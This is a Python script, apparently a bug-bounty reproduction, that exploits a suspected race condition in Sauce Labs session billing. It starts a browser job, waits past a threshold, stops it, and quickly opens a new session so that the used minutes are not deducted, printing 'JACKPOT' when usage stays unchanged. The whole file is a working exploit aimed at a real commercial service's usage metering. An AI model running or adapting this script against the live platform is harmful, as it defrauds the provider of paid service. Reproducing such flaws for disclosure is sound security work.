import requests
import time
import json
import argparse
from datetime import datetime

# Parse args for universal creds
parser = argparse.ArgumentParser(description="Universal Sauce Labs Session Race Repro")
parser.add_argument('--username', required=True, help="Sauce Labs username")
parser.add_argument('--access_key', required=True, help="Sauce Labs access key")
parser.add_argument('--wait_minutes', type=int, default=7, help="Minutes to run first session (default 7)")
parser.add_argument('--region', default='us-west-1', help="Region (default us-west-1)")
args = parser.parse_args()

USERNAME = args.username
ACCESS_KEY = args.access_key
HUB_URL = f"https://ondemand.{args.region}.saucelabs.com:443/wd/hub"
API_URL = f"https://api.{args.region}.saucelabs.com"
auth = (USERNAME, ACCESS_KEY)
headers = {'Content-Type': 'application/json'}

def check_usage():
    """Grab recent activity mins—daily aggregate for free tier changes"""
    try:
        response = requests.get(f"{API_URL}/rest/v1/{USERNAME}/activity?level=user", auth=auth)
        if response.status_code == 200:
            data = response.json()
            recent_mins = data.get('minutes', [0])[-1] if data.get('minutes') else 0
            print(f"[INFO] Recent daily mins used: {recent_mins}")
            return recent_mins
        else:
            print(f"[-] Activity fetch failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Usage check error: {e}")
    return None

def start_session():
    """Start a simple Chrome job via WebDriver API"""
    payload = {
        "desiredCapabilities": {
            "browserName": "chrome",
            "platformName": "Windows 10",
            "browserVersion": "latest",
            "name": f"Race Repro Session - {datetime.now().isoformat()}"
        }
    }
    try:
        response = requests.post(f"{HUB_URL}/session", json=payload, auth=auth, headers=headers)
        if response.status_code == 303:  # WebDriver redirect on success
            location = response.headers.get('Location', '').split('/')[-1]
            if location:
                print(f"[+] Session started: {location} (job_id)")
                return location
        elif response.status_code == 200:
            session_data = response.json()
            session_id = session_data.get('sessionId')
            if session_id:
                print(f"[+] Session started: {session_id}")
                return session_id
        print(f"[-] Start failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Start error: {e}")
    return None

def stop_session(job_id):
    """Stop the job via REST API"""
    if not job_id:
        return False
    try:
        stop_response = requests.put(f"{API_URL}/rest/v1/{USERNAME}/jobs/{job_id}/stop", auth=auth)
        if stop_response.status_code == 200:
            print(f"[+] Stopped job: {job_id}")
            return True
        print(f"[-] Stop failed: {stop_response.status_code} - {stop_response.text}")
    except Exception as e:
        print(f"[-] Stop error: {e}")
    return False

# Main repro flow
print(f"[*] Universal Race Repro for Sauce Labs - Account: {USERNAME}")
print(f"[*] Region: {args.region} | Wait: {args.wait_minutes} mins")
initial_usage = check_usage()
print(f"[INFO] Initial snapshot: {initial_usage} mins used")

# Step 1: Start first session
job_id = start_session()
if not job_id:
    print("[-] Aborting - couldn't start session")
    exit(1)

# Step 2: Run past warning threshold
wait_secs = args.wait_minutes * 60
print(f"[*] Burning {wait_secs} secs to hit race window...")
time.sleep(wait_secs)

# Step 3: Stop it (race trigger)
stopped = stop_session(job_id)
if not stopped:
    print("[-] Warning: Stop may have glitched—check manually")

# Step 4: New session ASAP to bypass deduction
print("[*] Launching new session for the win...")
new_job_id = start_session()
if new_job_id:
    print(f"[+] New session: {new_job_id} - Race complete!")
    # Quick stop to not waste more mins
    time.sleep(10)
    stop_session(new_job_id)
else:
    print("[-] New session flopped—retry with fresh timing")

final_usage = check_usage()
print(f"[INFO] Final snapshot: {final_usage} mins used")
if initial_usage is not None and final_usage == initial_usage:
    print("[!] JACKPOT! No deduction—bug confirmed. Screenshot dashboard now.")
else:
    print("[?] Usage shifted—tweak wait time or check free tier balance manually.")

print("[*] Repro done. For validation: Compare dashboard 'Remaining Minutes' before/after run.")
